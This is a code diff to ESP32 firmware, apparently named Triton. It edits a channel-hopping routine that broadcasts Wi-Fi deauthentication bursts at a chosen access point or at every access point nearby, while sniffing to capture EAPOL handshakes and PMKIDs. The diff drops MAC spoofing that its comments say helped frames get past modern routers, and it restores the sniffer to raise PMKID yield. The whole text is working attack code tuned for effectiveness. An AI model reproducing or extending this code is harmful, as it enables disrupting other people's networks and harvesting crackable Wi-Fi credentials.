@@ -457,25 +457,24 @@ static void hop_task(void *)
 
         if (hunt_period > 0 && millis() - last_hunt > hunt_period) {
             last_hunt = millis();
+            /* Previous rev did wifi_silent_ap_set_source_mac + begin +
+             * end + clear per hop. On IDF 5.5 that cycle internally
+             * calls esp_wifi_stop()/set_mac()/start() and after a few
+             * minutes it deadlocks the WiFi task, freezing the device
+             * or forcing a watchdog reset. Back to the battle-tested
+             * session-wide softAP: one begin at the start of each
+             * deauth phase, one end when the burst finishes, no MAC
+             * spoofing. Frame addr2 stays = our AP MAC which some
+             * modern routers will drop, but Triton stays alive. */
+            wifi_silent_ap_begin(s_ch);
             if (s_mode == TM_SURGICAL) {
-                /* Spoof addr2 = target BSSID so clients/routers accept
-                 * the frame as legitimately from the AP. Previously
-                 * addr2 was our own MAC, which PMF-capable and modern
-                 * APs silently drop. */
-                wifi_silent_ap_set_source_mac(s_target_bssid);
-                wifi_silent_ap_begin(s_ch);
                 int bursts = 8;
                 for (int k = 0; k < bursts && s_alive; ++k) {
                     int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
                     s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                     delay(5);
                 }
-                wifi_silent_ap_end();
-                wifi_silent_ap_set_source_mac(nullptr);
             } else {
-                /* Snapshot BSSIDs under the mux — cache_beacon can fire
-                 * on the Wi-Fi task at any time and would otherwise race
-                 * the read of s_bs[i].bssid below. */
                 uint8_t bssids[BS_N][6];
                 int nb = 0;
                 portENTER_CRITICAL(&s_bs_mux);
@@ -484,27 +483,25 @@ static void hop_task(void *)
                 nb = cap;
                 portEXIT_CRITICAL(&s_bs_mux);
 
-                /* Round-robin one BSSID per hop. Spoof its MAC as the
-                 * softAP's source. Takes more wall-clock across the full
-                 * AP list (24 BSSIDs * 1.5 s hop = 36 s/cycle in HUNT)
-                 * but each frame lands with the correct addr2 so
-                 * modern clients actually honour it. */
-                static int s_bs_idx = 0;
                 int bursts = (s_mode == TM_STORM) ? 6 : 3;
-                if (nb > 0) {
-                    int target = s_bs_idx % nb;
-                    s_bs_idx = (s_bs_idx + 1) % nb;
-                    wifi_silent_ap_set_source_mac(bssids[target]);
-                    wifi_silent_ap_begin(s_ch);
-                    for (int k = 0; k < bursts && s_alive; ++k) {
-                        int sent = wifi_deauth_broadcast(bssids[target], &seq);
+                for (int i = 0; i < nb && s_alive; ++i) {
+                    for (int k = 0; k < bursts; ++k) {
+                        int sent = wifi_deauth_broadcast(bssids[i], &seq);
                         s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                         delay(5);
                     }
-                    wifi_silent_ap_end();
-                    wifi_silent_ap_set_source_mac(nullptr);
                 }
             }
+            wifi_silent_ap_end();
+            /* wifi_silent_ap_end() disables promiscuous as part of
+             * cleanup (it's meant to fully exit the mode). Triton
+             * NEEDS the promisc sniffer back up for the dwell window
+             * to catch beacons / EAPOL / PMKID — re-arm right here.
+             * Without this Triton only captures during the 20 ms TX
+             * phase of each hop and PMKID yield drops to ~zero. */
+            esp_wifi_set_promiscuous(true);
+            esp_wifi_set_promiscuous_rx_cb(cb);
+            esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
         }
 
         /* Drain any PMKID/handshake captures that the Wi-Fi callback
